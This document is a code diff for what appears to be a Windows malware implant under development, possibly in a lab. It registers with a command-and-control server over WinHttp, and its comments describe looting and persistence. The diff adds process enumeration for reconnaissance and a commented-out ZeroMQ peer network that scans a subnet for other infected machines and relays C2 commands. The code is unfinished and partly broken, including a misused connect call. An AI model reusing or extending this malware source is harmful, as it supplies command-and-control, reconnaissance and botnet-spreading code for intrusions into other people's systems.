@@ -20,11 +20,30 @@
 #include <windows.h>
 #include <stdio.h>
 #include <winhttp.h>
+#include <Psapi.h>
 #include <zmq.h>
 
-void RegisterC2(_TCHAR* gid){
+void ReadEnvironmentVariables(){
+    DWORD* pidList = (DWORD*)malloc(sizeof(DWORD) * 200);
+    LPDWORD dataRead = (LPDWORD)malloc(sizeof(DWORD));
+    BOOL success = EnumProcesses(
+        pidList,
+        200*sizeof(DWORD),
+        dataRead
+    );
+    
+    if(success){
+        // TODO: Add check to see if dataRead is maximum size of pid list, meaning there is more processes to list
+        long size = *dataRead / sizeof(DWORD);
+        for(int i = 0; i < size; i++){
+            printf("Proc PID: %d\n", pidList[i]);
+        }     
+    }else{
+        printf("failure: %d\n", GetLastError());
+    }
+}
 
-    void *context = zmq_ctx_new();
+void RegisterC2(_TCHAR* gid){
 
     HINTERNET session = WinHttpOpen(
         L"Diplomat", 
@@ -95,18 +114,48 @@ void RegisterC2(_TCHAR* gid){
 }
 
 int _tmain(int argc, _TCHAR *argv[]){
-    // First node executed on the network, woohoo!
+    /*
     if(argc == 2){
         // Report intrusion to C2
         _TCHAR* gid = malloc(64);
         sprintf(gid, "239");
         RegisterC2(gid);
     }
+    */
 
     // Do malware things (investigation, looting, persistence)
-    
+
+    // Situational Awareness tasks
+    ReadEnvironmentVariables();
+
+    /*
+
     // Establish peer network
     // Create a router for recieving messages
+    void* context = zmq_ctx_new();
+    void* router = zmq_socket(context, ZMQ_ROUTER);
+    int success = zmq_bind(router, "tcp://*:8889");
+    if (success != 0){
+
+    }
+
+    // Scan network for other infected machines
+    // Brute force method
+    void* dealer = zmq_socket(context, ZMQ_DEALER);
+    for(int address = 1; address < 255; address++){
+        zmq_connect(dealer, "tcp://192.168.56.%d:8889", address);
+    }
+
 
     // Timed loop for checking potential peers and retrieving commands from c2
+    while(1){
+        // Read router activity
+        _TCHAR* buffer = malloc(64*sizeof(char));
+        zmq_recv(router, buffer, 64, 0);
+        printf("Incoming message: %s", buffer);
+        Sleep(10000);
+        zmq_send(dealer, buffer, 64, 0);
+    }
+
+    */
 }
